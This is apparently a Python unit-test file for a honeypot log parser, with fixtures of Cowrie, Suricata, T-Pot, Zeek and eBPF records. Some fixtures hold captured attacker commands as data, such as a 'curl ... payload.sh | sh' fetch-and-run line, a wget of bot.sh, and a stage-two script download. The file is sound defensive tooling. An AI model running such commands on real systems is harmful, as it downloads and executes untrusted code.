from __future__ import annotations

import gzip
from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from honeypot_ai.parsers import TPOT_TYPES, TPOT_TYPE_ALIASES, parse_file, parse_paths, parse_record


ROOT = Path(__file__).resolve().parents[1]


class ParserTests(unittest.TestCase):
    def test_cowrie_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:00:15Z",
                "eventid": "cowrie.command.input",
                "src_ip": "198.51.100.23",
                "session": "s1",
                "input": "wget http://203.0.113.50/bot.sh",
            }
        )

        self.assertEqual(event.source, "cowrie")
        self.assertEqual(event.event_type, "cowrie.command.input")
        self.assertEqual(event.session, "s1")
        self.assertIn("wget", event.command or "")

    def test_dionaea_incident_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:05:00Z",
                "origin": "dionaea.connection.tcp.accept",
                "data": {
                    "connection": {
                        "local_ip": "10.0.5.20",
                        "local_port": 445,
                        "remote_ip": "203.0.113.70",
                        "remote_port": 52944,
                        "protocol": "smbd",
                        "transport": "tcp",
                    }
                },
            }
        )

        self.assertEqual(event.source, "dionaea")
        self.assertEqual(event.src_ip, "203.0.113.70")
        self.assertEqual(event.dest_port, 445)

    def test_suricata_alert_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:07:00.000000+0000",
                "event_type": "alert",
                "src_ip": "203.0.113.70",
                "src_port": 52944,
                "dest_ip": "10.0.5.20",
                "dest_port": 445,
                "proto": "TCP",
                "alert": {"category": "Malware Command and Control Activity Detected"},
            }
        )

        self.assertEqual(event.source, "suricata")
        self.assertEqual(event.event_type, "alert")
        self.assertEqual(event.protocol, "TCP")

    def test_tpot_source_hint_dispatches_cowrie_record(self) -> None:
        event = parse_record(
            {
                "@timestamp": "2026-05-17T12:00:00Z",
                "type": "Cowrie",
                "eventid": "cowrie.command.input",
                "src_ip": "198.51.100.44",
                "dst_ip": "10.0.5.20",
                "dst_port": 22,
                "session": "tpot-cowrie-1",
                "input": "curl http://203.0.113.80/payload.sh | sh",
                "t-pot_hostname": "sensor-a",
            },
            source_hint="tpot",
        )

        self.assertEqual(event.source, "cowrie")
        self.assertEqual(event.timestamp.isoformat(), "2026-05-17T12:00:00+00:00")
        self.assertEqual(event.dest_ip, "10.0.5.20")
        self.assertIn("curl", event.command or "")

    def test_tpot_normalized_generic_record(self) -> None:
        event = parse_record(
            {
                "@timestamp": "2026-05-17T12:03:00Z",
                "type": "ConPot",
                "src_ip": "203.0.113.88",
                "src_port": "44612",
                "dst_ip": "10.0.5.20",
                "dst_port": "502",
                "protocol": "tcp",
                "request": "modbus read coils",
                "t-pot_ip_ext": "198.51.100.10",
            }
        )

        self.assertEqual(event.source, "conpot")
        self.assertEqual(event.event_type, "conpot.event")
        self.assertEqual(event.src_port, 44612)
        self.assertEqual(event.dest_port, 502)
        self.assertEqual(event.command, "modbus read coils")

    def test_all_tpot_managed_service_types_normalize(self) -> None:
        managed_types = TPOT_TYPES | set(TPOT_TYPE_ALIASES)

        for raw_type in sorted(managed_types):
            with self.subTest(raw_type=raw_type):
                event = parse_record(
                    {
                        "@timestamp": "2026-05-17T12:03:00Z",
                        "type": raw_type,
                        "src_ip": "203.0.113.88",
                        "src_port": "44612",
                        "dst_ip": "10.0.5.20",
                        "dst_port": "502",
                    }
                )

                self.assertEqual(event.source, TPOT_TYPE_ALIASES.get(raw_type, raw_type))

    def test_tpot_generic_record_extracts_common_ecs_fields(self) -> None:
        event = parse_record(
            {
                "@timestamp": "2026-05-17T12:03:00Z",
                "type": "Heralding",
                "event": {"action": "auth-attempt"},
                "source": {"ip": "203.0.113.91", "port": "44612"},
                "destination": {"ip": "10.0.5.20", "port": "22"},
                "network": {"transport": "tcp"},
                "user": {"name": "root"},
                "url": {"original": "ssh://10.0.5.20:22"},
                "file": {"hash": {"sha256": "A" * 64}},
            }
        )

        self.assertEqual(event.source, "heralding")
        self.assertEqual(event.event_type, "auth-attempt")
        self.assertEqual(event.src_ip, "203.0.113.91")
        self.assertEqual(event.src_port, 44612)
        self.assertEqual(event.dest_ip, "10.0.5.20")
        self.assertEqual(event.dest_port, 22)
        self.assertEqual(event.protocol, "tcp")
        self.assertEqual(event.username, "root")
        self.assertEqual(event.url, "ssh://10.0.5.20:22")
        self.assertEqual(event.hashes["sha256"], "a" * 64)

    def test_tpot_suricata_record_uses_suricata_parser(self) -> None:
        event = parse_record(
            {
                "@timestamp": "2026-05-17T12:04:00Z",
                "type": "Suricata",
                "event_type": "alert",
                "src_ip": "203.0.113.90",
                "src_port": 53320,
                "dest_ip": "10.0.5.20",
                "dest_port": 80,
                "proto": "TCP",
                "alert": {"signature": "ET MALWARE C2 checkin"},
            },
            source_hint="tpot",
        )

        self.assertEqual(event.source, "suricata")
        self.assertEqual(event.event_type, "alert")
        self.assertEqual(event.dest_port, 80)

    def test_zeek_conn_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314140.305988,
                "uid": "C5bLoe2Mvxqhawzqqd",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 46378,
                "id.resp_h": "203.0.113.70",
                "id.resp_p": 80,
                "proto": "tcp",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.session, "C5bLoe2Mvxqhawzqqd")
        self.assertEqual(event.dest_ip, "203.0.113.70")

    def test_zeek_http_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314160.0,
                "uid": "CHttp1",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 46380,
                "id.resp_h": "203.0.113.70",
                "id.resp_p": 80,
                "method": "GET",
                "host": "payload.example",
                "uri": "/stage2.sh",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.event_type, "zeek.http")
        self.assertEqual(event.domain, "payload.example")
        self.assertEqual(event.url, "http://payload.example/stage2.sh")

    def test_zeek_dns_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314170.0,
                "uid": "CDns1",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 54321,
                "id.resp_h": "10.0.5.1",
                "id.resp_p": 53,
                "proto": "udp",
                "query": "payload.example",
                "qtype_name": "A",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.event_type, "zeek.dns")
        self.assertEqual(event.domain, "payload.example")

    def test_ebpf_record(self) -> None:
        event = parse_record(
            {
                "schema_version": 1,
                "timestamp": "2026-06-16T12:00:02Z",
                "host": "sensor-a",
                "event_type": "network_connect",
                "pid": 1001,
                "binary": "/usr/bin/curl",
                "arguments_sample": ["curl", "http://203.0.113.80/payload.sh"],
                "src_ip": "10.0.5.20",
                "src_port": 42344,
                "dest_ip": "203.0.113.80",
                "dest_port": 80,
                "protocol": "tcp",
                "severity_hint": "medium",
            }
        )

        self.assertEqual(event.source, "ebpf")
        self.assertEqual(event.event_type, "ebpf.network_connect")
        self.assertEqual(event.src_ip, "10.0.5.20")
        self.assertEqual(event.dest_port, 80)
        self.assertIn("curl", event.command or "")

    def test_parse_ebpf_fixture(self) -> None:
        events = parse_file(ROOT / "sample_logs" / "ebpf-events.ndjson")

        self.assertEqual(len(events), 4)
        self.assertEqual({event.source for event in events}, {"ebpf"})
        self.assertTrue(any(event.event_type == "ebpf.privilege_change" for event in events))

    def test_parse_paths_includes_rotated_json_logs(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "cowrie.json.1").write_text(
                '{"timestamp":"2026-05-16T20:00:00Z","eventid":"cowrie.login.failed","src_ip":"203.0.113.5"}\n',
                encoding="utf-8",
            )
            with gzip.open(root / "cowrie.json.2.gz", "wt", encoding="utf-8") as handle:
                handle.write(
                    '{"timestamp":"2026-05-16T20:00:01Z","eventid":"cowrie.login.failed","src_ip":"203.0.113.6"}\n'
                )

            events = parse_paths([root])

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].event_type, "cowrie.login.failed")

    def test_parse_paths_includes_compressed_rotated_json_logs(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            with gzip.open(root / "snare.json.1.gz", "wt", encoding="utf-8") as handle:
                handle.write(
                    '{"timestamp":"2026-05-16T20:00:00Z","type":"Snare","source.ip":"203.0.113.5"}\n'
                )

            events = parse_paths([root], source_hint="tpot")

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].source, "snare")
        self.assertEqual(events[0].src_ip, "203.0.113.5")

    def test_tpot_directory_walk_includes_plain_logs(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "cowrie.json").write_text(
                '{"timestamp":"2026-05-16T20:00:00Z","type":"Cowrie","eventid":"cowrie.login.failed","src_ip":"203.0.113.5"}\n',
                encoding="utf-8",
            )
            (root / "endlessh.log").write_text("2026-05-16T20:00:01Z ACCEPT host=203.0.113.6\n", encoding="utf-8")

            events = parse_paths([root], source_hint="tpot")

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].source, "cowrie")
        self.assertEqual(events[1].source, "endlessh")
        self.assertEqual(events[1].src_ip, "203.0.113.6")

    def test_tpot_directory_walk_includes_csv_and_archives(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            heralding = root / "heralding" / "log"
            heralding.mkdir(parents=True)
            (heralding / "auth.csv").write_text(
                "timestamp,source.ip,source.port,user.name,password\n"
                "2026-05-16T20:00:02Z,203.0.113.8,4444,root,toor\n",
                encoding="utf-8",
            )
            archive = root / "cowrie" / "downloads.tgz"
            archive.parent.mkdir()
            with gzip.open(archive, "wb") as handle:
                handle.write(b"not a tar archive")

            events = parse_paths([root], source_hint="tpot")

        self.assertEqual(len(events), 2)
        by_source = {event.source: event for event in events}
        self.assertEqual(by_source["heralding"].src_ip, "203.0.113.8")
        self.assertEqual(by_source["cowrie"].event_type, "cowrie.archive")


if __name__ == "__main__":
    unittest.main()
